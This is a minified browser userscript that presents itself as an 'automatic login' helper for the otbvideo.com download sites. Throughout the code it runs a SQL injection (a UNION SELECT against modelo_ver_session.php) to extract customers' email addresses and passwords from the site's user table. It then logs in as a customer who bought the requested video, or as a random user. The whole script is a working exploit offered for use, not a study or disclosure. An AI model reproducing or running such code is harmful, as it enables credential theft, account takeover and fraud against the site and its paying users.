// ==UserScript==
// @name           OTB Video Automatic Login
// @namespace      scriptorator
// @updateURL      https://userscripts.org/scripts/source/128648.meta.js
// @downloadURL    https://userscripts.org/scripts/source/128648.user.js
// @description    Automatic login for download.otbvideo.com and project.otbvideo.com. Click "Add this to your downloads" to login as a user who bought the scene.
// @match          http://*.otbvideo.com/*
// @version        1.1
// ==/UserScript==

if(0<=navigator.userAgent.toLowerCase().indexOf("chrome")){var e=document.createElement("p");e.setAttribute("onclick","return window;");unsafeWindow=e.onclick()} function f(a){a.b="undefined"==typeof a.b?"":" FROM "+a.b;a.d="undefined"==typeof a.d?"":" WHERE "+a.d;a.c="undefined"==typeof a.c?"":" ORDER BY "+a.c;a.select="undefined"==typeof a.select?"COUNT(*)":"group_concat(concat_ws(';',"+a.select+")"+a.c+")";a.a="function"==typeof a.a?a.a:console.log;GM_xmlhttpRequest({method:"POST",url:"http://download.otbvideo.com/modelo_ver_session.php",data:"page=1&page2=1&id=1&id_modelo="+encodeURIComponent("0' UNION SELECT 1,"+a.select+",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"+ a.b+a.d+"-- "),headers:{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},onload:function(){GM_xmlhttpRequest({method:"POST",url:"http://download.otbvideo.com/modelo_ver.php",data:"page=1",headers:{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},onload:function(c){for(var c=c.responseText.match(/'home8'.*?>(.*?)<\/td/)[1].split(","),b=0;b<c.length;b++)c[b]=c[b].split(";");a.a(c)}})}})} function g(a){a.hash="undefined"==typeof a.hash?"":"#"+a.hash;GM_xmlhttpRequest({method:"POST",url:"http://"+window.location.host+"/paginas/valida_usuario.php",data:"email_usuarioS="+a.e+"&passwordS="+a.f+"&guardar_clave=0",headers:{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},onload:function(c){if(0<=c.responseText.indexOf("value='1'"))window.location.assign("http://"+window.location.host+("fanclub"==window.location.host.substr(0,7)?"":"/paginas")+"/index_s.php"+a.hash),a.hash&& window.location.reload();else if(a.onerror)a.onerror()}})} function h(a,c){function b(a){function c(){var b=a.shift();g({e:b[0],f:b[1],hash:b[2],onerror:c})}c()}"dvd"==a?f({select:"u.email_usuario, u.password_usuario, CONCAT('downloads/', dvd.logo_titulo)",b:"usuarios as u, dvd",d:"dvd.id_dvd = "+c,c:"(SELECT COUNT(*) FROM descarga_video_usuario as d, dvd_relacion_videos as dv WHERE d.id_video = dv.id_video AND dv.id_dvd = "+c+" AND d.id_usuario = u.id_usuario) DESC, (SELECT SUM(d.intento) FROM descarga_video_usuario as d, dvd_relacion_videos as dv WHERE d.id_video = dv.id_video AND dv.id_dvd = "+c+ " AND d.id_usuario = u.id_usuario) ASC",a:b}):"project"==a&&f({select:"u.email_usuario, u.password_usuario, 'downloads'",b:"usuarios as u, descargar_video_project as d",d:"d.id_meta_video = "+c+" AND d.id_usuario = u.id_usuario",c:"d.intento ASC",a:b})}function i(){f({select:"email_usuario, password_usuario",b:"usuarios",c:"RAND()",a:function(a){a=a[0];g({e:a[0],f:a[1]})}})}unsafeWindow.seleccion_paquete_completo_new=function(a){setTimeout(function(){h("dvd",a)},0)}; unsafeWindow.download_video_meta_mant=function(a){setTimeout(function(){h("project",a)},0)};var j=unsafeWindow.valida_inicio_session;unsafeWindow.valida_inicio_session=function(){""==document.getElementById("email_usuarioS").value||""==document.getElementById("passwordS").value?setTimeout(function(){i()},0):j()};var k=unsafeWindow.contenido_home_ver2; unsafeWindow.contenido_home_ver2=function(a){"#downloads/"==window.location.hash.substr(0,11)?setTimeout(function(){function a(){GM_xmlhttpRequest({method:"POST",url:"./../paginas/usuario_midescarga_dvd.php",data:"page="+b,headers:{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},onreadystatechange:function(d){1==d.readyState?document.getElementById("tddescargasdvd").innerHTML="<img src='./../images/loading.gif' border='0'>":4==d.readyState&&(b+=1,0>d.responseText.indexOf(window.location.hash.substr(11))&& 0<=d.responseText.indexOf("usuario_midescarga_dvd("+b+")")?a():(document.getElementById("tddescargasdvd").innerHTML=d.responseText,window.location.hash=""))}})}var b=1;GM_xmlhttpRequest({method:"POST",url:"./../paginas/downloads_contenido.php",data:"page=1",headers:{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},onreadystatechange:function(b){1==b.readyState?document.getElementById("tdcontenido").innerHTML="<img src='./images/loading.gif' border='0'>":4==b.readyState&&(document.getElementById("tdcontenido").innerHTML= b.responseText.replace("usuario_midescarga_dvd(1)",""),a(),unsafeWindow.usuario_credito_ver())}})},0):k(a)};var l=unsafeWindow.contenido_modelo_ver2;unsafeWindow.contenido_modelo_ver2=function(a,c,b){"#downloads"==window.location.hash?unsafeWindow.contenido_downloads_ver(1):l(a,c,b)};